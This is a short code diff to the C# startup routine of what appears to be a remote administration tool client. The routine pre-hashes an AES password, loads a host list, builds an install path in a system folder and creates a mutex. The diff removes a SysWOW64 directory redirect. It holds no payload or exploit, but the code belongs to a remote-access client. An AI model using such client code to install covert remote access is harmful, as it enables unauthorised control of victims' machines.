@@ -119,13 +119,7 @@ namespace xClient
 
             AES.PreHashKey(Settings.PASSWORD);
             _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
-
-            // https://stackoverflow.com/questions/3540930/getting-syswow64-directory-using-32-bit-application
-            if (PlatformHelper.Architecture == 64 && Settings.DIR == Environment.GetFolderPath(Environment.SpecialFolder.System))
-                Settings.DIR = NativeMethodsHelper.GetSystemWow64Directory();
-
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
-
             GeoLocationHelper.Initialize();
 
             if (!MutexHelper.CreateMutex(Settings.MUTEX))
